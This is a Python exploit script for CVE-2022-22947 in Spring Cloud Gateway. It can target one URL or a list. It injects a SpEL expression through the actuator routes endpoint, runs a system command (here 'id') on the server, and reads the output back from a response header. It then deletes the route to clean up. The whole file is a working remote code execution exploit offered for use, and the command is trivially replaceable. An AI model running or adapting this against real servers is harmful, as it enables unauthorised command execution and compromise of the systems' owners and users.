import argparse
import requests
import sys
from urllib import parse as urlparse
import json
from termcolor import cprint

# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

cprint('[#] CVE-2022-22947 - Spring-Cloud-Gateway-RCE', "magenta")

if len(sys.argv) <= 1:
    print('\n%s -h for help.' % (sys.argv[0]))
    exit(0)

headers1 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/json'
}

headers2 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
}

payload = '''{\r
    "id": "hacktest",\r
    "filters": [{\r
    "name": "AddResponseHeader",\r
    "args": {"name": "Result","value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"id\\\"}).getInputStream()))}"}\r
    }],\r
    "uri": "http://example.com",\r
    "order": 0\r
}'''

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
                    dest="url",
                    help="Check a single URL.",
                    action='store')
parser.add_argument("-p", "--proxy",
                    dest="proxy",
                    help="send requests through proxy",
                    action='store')
parser.add_argument("-l", "--list",
                    dest="urlslist",
                    help="Check a list of URLs.",
                    action='store')

args = parser.parse_args()

proxies = {}
if args.proxy:
    proxies = {"http": args.proxy, "https": args.proxy}

def parse_url(url):
    """
    Parses the URL.
    """

    # Url: https://example.com/login.jsp
    url = url.replace('#', '%23')
    url = url.replace(' ', '%20')

    if ('://' not in url):
        url = str("http://") + str(url)
    scheme = urlparse.urlparse(url).scheme

    # FilePath: /login.jsp
    file_path = urlparse.urlparse(url).path
    if (file_path == ''):
        file_path = '/'

    return({"scheme": scheme,
            "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
            "host":  urlparse.urlparse(url).netloc.split(":")[0],
            "file_path": file_path})

def scan_url(url):
    parsed_url = parse_url(url)
    try:
        res1 = requests.post(url=parsed_url["site"] + "/actuator/gateway/routes/hacktest",
                            data=payload,
                            headers=headers1,
                            json=json,
                            proxies=proxies)
        if (res1.status_code != 201):
            return({"status":res1.status_code,
                    "context":res1.text})
        res2 = requests.post(url=parsed_url["site"] + "/actuator/gateway/refresh",
                            headers=headers2,
                            proxies=proxies)
        res3 = requests.get(url=parsed_url["site"] + "/actuator/gateway/routes/hacktest",
                            headers=headers2,
                            proxies=proxies)
        requests.delete(url=parsed_url["site"] + "/actuator/gateway/routes/hacktest",
                        headers=headers2,proxies=proxies)
        requests.post(url=parsed_url["site"] + "/actuator/gateway/refresh",
                        headers=headers2,proxies=proxies)
        if res3.status_code:
            return({"status":res3.status_code,
                    "text":res3.text})
    except Exception as e:
        cprint(f"[#] connection error happened on {url}", "blue")
        return({"status":0,
                "text":"error"})

def main():
    urls = []
    if args.url:
        urls.append(args.url)
    if args.urlslist:
        with open(args.urlslist, "r") as f:
            for i in f.readlines():
                i = i.strip()
                if i == "" or i.startswith("#"):
                    continue
                urls.append(i)
    
    cprint("[#] checking CVE-2022-22947", "magenta")
    for url in urls:
        #cprint(f"[-] URL: {url}", "magenta")
        result = scan_url(url)
        if result["status"] == 0:
            continue
        if result["status"] == 200:
            context = result["text"]
            cprint(f"[+] {url} Affected", "red")
            cprint(f"[+] {context}" , "yellow")
        else:
            cprint(f"[-] {url} completed", "green")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt Detected.")
        print("Exiting...")
        exit(0)